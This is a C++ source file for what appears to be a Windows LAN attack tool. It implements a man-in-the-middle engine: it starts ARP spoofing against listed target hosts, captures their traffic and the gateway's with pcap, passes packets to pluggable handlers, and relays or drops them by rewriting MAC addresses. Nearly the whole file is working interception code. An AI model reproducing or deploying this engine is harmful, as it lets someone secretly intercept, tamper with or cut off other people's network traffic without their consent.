#include "stdafx.h"
#include "MITM.h"
#include <pcap.h>
#include <thread>
#include "Helper.h"
#include "Packet.h"
#include "ThreadPool.h"
#include "NetManager.h"


MITM& g_mitm = MITM::GetInstance();


MITM::Config& MITM::GetConfig(IpAddress ip)
{
	if (m_attackList.find(ip) == m_attackList.end()) // add config
	{
		MacAddress mac = g_netManager.m_host[ip];

		std::shared_ptr<Config> config(new Config);
		m_attackList[ip] = config;
		m_attackListMac[mac] = config;
	}
	Config& config = *m_attackList[ip];
	return config;
}

void MITM::SetConfig(IpAddress ip, bool forward)
{
	Config& config = GetConfig(ip);
	config.forward = forward;
}

void MITM::StartAttack(std::function<void()> onThreadStart, std::function<void()> onThreadEnd)
{
	m_isAttacking = true;
	g_threadPool.AddTask([=]{
		// start capture
		std::thread packetHandleThread(&MITM::PacketHandleThread, this);
		// start cheating
		m_arpCheat->StartAttack();

		onThreadStart();

		// wait
		packetHandleThread.join();
		m_arpCheat->StopAttack();

		// stop
		onThreadEnd();

		TRACE("attack end\n");
	});
}

void MITM::StopAttack()
{
	m_isAttacking = false;
}

void MITM::AddPacketHandler(PacketHandler* packetHandler)
{
	m_packetHandlers.push_back(packetHandler);
}

void MITM::PacketHandleThread()
{
	AdapterHandle adapter(GetAdapterHandle());
	if (adapter == nullptr)
		return;

	// start capture
	SetFilter(adapter.get(), "not host " + (CString)g_netManager.m_selfIp);
	pcap_pkthdr* header;
	const BYTE* pkt_data;
	int res;
	while (m_isAttacking && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
	{
		if (res == 0) // timeout
			continue;

		auto targetIt = m_attackListMac.find(*(MacAddress*)(pkt_data + 6));
		if (targetIt != m_attackListMac.end()) // is target packet
		{
			Config& target = *targetIt->second;
			target.send++;

			bool forward = target.forward;
			// call packet handlers
			for (auto i : m_packetHandlers)
				forward = forward && i->OnTargetPacket(header, pkt_data);

			if (forward)
			{
				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
				*(MacAddress*)newData.get() = g_netManager.m_gatewayMac; // destination MAC
				*(MacAddress*)(newData.get() + 6) = g_netManager.m_selfMac; // source MAC
				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
			}
			continue;
		}
		// target packet end

		if (*(MacAddress*)(pkt_data + 6) == g_netManager.m_gatewayMac // is gateway packet
			&& *(WORD*)&pkt_data[12] == PROTOCOL_IP) // IP
		{
			const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
			auto targetIt = m_attackList.find(pIp->destinationIp);
			if (targetIt == m_attackList.end()) // not to target
				continue;
			Config& target = *targetIt->second;
			target.receive++;

			bool forward = target.forward;
			// call packet handlers
			for (auto i : m_packetHandlers)
				forward = forward && i->OnGatewayPacket(header, pkt_data);
			
			if (forward)
			{
				std::unique_ptr<BYTE[]> newData(new BYTE[header->len]);
				*(MacAddress*)newData.get() = g_netManager.m_host[targetIt->first]; // destination MAC
				*(MacAddress*)(newData.get() + 6) = g_netManager.m_selfMac; // source MAC
				memcpy(newData.get() + 12, pkt_data + 12, header->len - 12); // data
				pcap_sendpacket(adapter.get(), (u_char*)newData.get(), header->len);
			}
		}
		// gateway packet end
	}
	// capture end
	TRACE("capture end\n");
}
